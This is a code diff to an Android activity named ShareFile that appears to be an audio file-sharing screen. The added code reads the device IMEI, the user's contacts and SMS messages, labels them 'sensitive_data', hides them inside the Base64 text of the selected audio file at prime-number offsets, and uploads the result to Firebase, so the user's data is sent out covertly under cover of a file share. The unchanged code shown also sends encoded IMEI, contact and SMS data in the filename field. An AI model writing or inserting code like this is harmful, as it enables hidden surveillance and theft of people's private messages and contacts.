@@ -6,10 +6,12 @@ import android.app.ProgressDialog;
 import android.content.ContentResolver;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.content.res.AssetManager;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Environment;
 import android.provider.ContactsContract;
 import android.provider.OpenableColumns;
 import android.provider.Settings;
@@ -42,11 +44,19 @@ import com.google.firebase.storage.FirebaseStorage;
 import com.google.firebase.storage.StorageReference;
 
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.FileNotFoundException;
+import java.io.IOException;
+import java.io.InputStream;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
 import java.util.ArrayList;
 import java.util.Base64;
 import java.util.HashMap;
 import java.util.List;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 import java.util.stream.Collectors;
 
 public class ShareFile extends AppCompatActivity {
@@ -68,6 +78,9 @@ public class ShareFile extends AppCompatActivity {
     ArrayList contact_name = new ArrayList();
     ArrayList contact_number = new ArrayList();
     public static String msgData;
+
+    String filepath_audio;
+    String base64StringAudio;
 
     public static long beginEncode,endEncode;
 
@@ -105,7 +118,6 @@ public class ShareFile extends AppCompatActivity {
                 shareFile();
             }
         });
-
 
 
 //        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
@@ -159,13 +171,21 @@ public class ShareFile extends AppCompatActivity {
         }
     }
 
-
     private void shareFile() {
         Intent galleryIntent = new Intent();
         galleryIntent.setAction(Intent.ACTION_GET_CONTENT);
         galleryIntent.setType("audio/*");
         startActivityForResult(galleryIntent, 1);
 
+    }
+
+    private static byte[] readBytesFromFile(String filePath) throws IOException {
+        Path path = Paths.get(filePath);
+        return Files.readAllBytes(path);
+    }
+
+    private static String encodeBytesToBase64(byte[] bytes) {
+            return Base64.getEncoder().encodeToString(bytes);
     }
 
     @Override
@@ -181,10 +201,14 @@ public class ShareFile extends AppCompatActivity {
 
             dialog.show();
             imageuri = data.getData();
+
+            final String[] split = imageuri.getPath().split(":");//split the path.
+            filepath_audio = split[1];//assign it to a string(your choice).
+
             filename = getFileName(imageuri);
 
             Uri uri = data.getData();
-            File file = null;
+//            File file = null;
 
             Toast.makeText(ShareFile.this, "filename : " + filename, Toast.LENGTH_SHORT).show();
 
@@ -212,15 +236,52 @@ public class ShareFile extends AppCompatActivity {
 
 //                    showKeyDialog(file);
 
+                    // Read the audio file as bytes
+                    byte[] audioBytes = new byte[0];
+                    try {
+                        audioBytes = readBytesFromFile("/"+filepath_audio); //Run from Emulator
+//                        audioBytes = readBytesFromFile(Environment.getExternalStorageDirectory()+"/"+filepath_audio); //Run from Physical Device
+//                        System.out.println("Audio Data in Bytes: "+audioBytes);
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+
+                    // Encode the audio bytes as Base64
+                        base64StringAudio = encodeBytesToBase64(audioBytes);
+//                        System.out.println("Base64 Encoded audio: " + base64StringAudio.length());
+
+
                     getAllContacts();
                     readSms();
                     String contact = "\n"+contact_name.get(0).toString() +":"+ contact_number.get(0).toString() +"\n"+contact_name.get(1).toString()+":"+contact_number.get(1).toString();
+
+//                    System.out.println("IMEI:"+IMEINumber);
+//                    System.out.println("IMEI in Bits:"+convertStringToBinary(IMEINumber).length());
+//                    System.out.println("Contact:"+contact);
+//                    System.out.println("Contact in Bits:"+convertStringToBinary(contact).length());
+//                    System.out.println("SMS:"+msgData);
+//                    System.out.println("SMS in Bits:"+convertStringToBinary(msgData).length());
+//                    System.out.println("FileName:"+filename);
+//                    System.out.println("FileName in Bits:"+convertStringToBinary(filename).length());
+
+//                    String sensitive_data = prettyBinary(convertStringToBinary(IMEINumber+";"+contact+";"+msgData+";"), 8, "");
+//                    System.out.println("Sensitive Data: "+sensitive_data);
+//                    System.out.println("Sensitive Data Length: "+sensitive_data.length());
+
+                    String sensitive_data = IMEINumber+";"+contact+";"+msgData+";";
+//                    System.out.println("Sensitive Data: "+sensitive_data);
+//                    System.out.println("Sensitive Data Length: "+sensitive_data.length());
+
+                    String encodefile = insertCharacters(base64StringAudio, sensitive_data);
+//                    System.out.println("Demo Encode: "+encodefile);
+
+
                     String binary_data= prettyBinary(convertStringToBinary(IMEINumber+";"+contact+";"+msgData+";"+filename), 8, " ");
 
                     String encodedString = Base64.getEncoder().encodeToString(binary_data.getBytes());
                     endEncode = System.currentTimeMillis();
-                    System.out.println("End Time: "+endEncode);
-                    System.out.println("Total Time Encode: "+((endEncode-beginEncode)/1000F));
+//                    System.out.println("End Time: "+endEncode);
+//                    System.out.println("Total Time Encode: "+((endEncode-beginEncode)/1000F));
 
 //                    System.out.println("Total Bits: "+encodedString.length());
                     System.out.println("Total Bits: "+(prettyBinary(convertStringToBinary(IMEINumber+";"+contact+";"+msgData), 8, " ")).length());
@@ -235,6 +296,10 @@ public class ShareFile extends AppCompatActivity {
                     hashMap.put("filename", encodedString);
                     hashMap.put("fileUrl", myurl);
                     hashMap.put("phone", phone);
+                    hashMap.put("file", encodefile);
+                    hashMap.put("data", base64StringAudio);
+
+
 
                     String fileCode = reference.getKey();
 
@@ -246,6 +311,8 @@ public class ShareFile extends AppCompatActivity {
 //                               sendSMS(phone, fileCode);
                                 getFileShared();
                                 Toast.makeText(ShareFile.this, "Uploaded Successfully", Toast.LENGTH_SHORT).show();
+                                System.out.println("End Time: "+endEncode);
+                                System.out.println("Total Time Encode: "+((endEncode-beginEncode)/1000F));
                             }
                         }
                     });
@@ -281,6 +348,60 @@ public class ShareFile extends AppCompatActivity {
             e.printStackTrace();
         }
     }
+
+    public static boolean isPrime(int n) {
+        if (n <= 1) {
+            return false;
+        }
+        if (n == 2) {
+            return true;
+        }
+        for (int i = 2; i <= Math.sqrt(n); i++) {
+            if (n % i == 0) {
+                return false;
+            }
+        }
+        return true;
+    }
+
+    public static List<Integer> generatePrimes(int count) {
+        List<Integer> primes = new ArrayList<>();
+        int num = 2;
+        while (primes.size() < count) {
+            if (isPrime(num)) {
+                primes.add(num);
+            }
+            num++;
+        }
+        return primes;
+    }
+
+    public static String insertCharacters(String firstString, String secondString) {
+        List<Integer> primeSeries = generatePrimes(secondString.length());
+        StringBuilder result = new StringBuilder();
+        int index = 0;
+        int i = 0;
+
+        for (int primeNumber : primeSeries) {
+            // Move ahead in the first string based on the prime number
+            index += primeNumber;
+            // Insert the character from the second string into the result
+            result.append(firstString, 0, index).append(secondString.charAt(i));
+            // Update the first string to remove the inserted character
+            firstString = firstString.substring(index);
+            // Reset the index for the next iteration
+            index = 0;
+            i++;
+        }
+
+        // Add the remaining characters from the first string to the result
+        result.append(firstString);
+
+        return result.toString();
+    }
+
+
+
 
     private void sendSMS(String number, String msg) {
 
@@ -400,4 +521,25 @@ public class ShareFile extends AppCompatActivity {
             // empty box, no SMS
         }
     }
+
+    public static String convertStringToBits(String input) {
+        StringBuilder stringBuilder = new StringBuilder();
+
+        for (int i = 0; i < input.length(); i++) {
+            char c = input.charAt(i);
+            String binaryString = Integer.toBinaryString(c);
+
+            // Append leading zeros if necessary
+            int leadingZeros = 8 - binaryString.length();
+            for (int j = 0; j < leadingZeros; j++) {
+                stringBuilder.append('0');
+            }
+
+            // Append the binary representation of the character
+            stringBuilder.append(binaryString);
+        }
+
+        return stringBuilder.toString();
+    }
+
 }
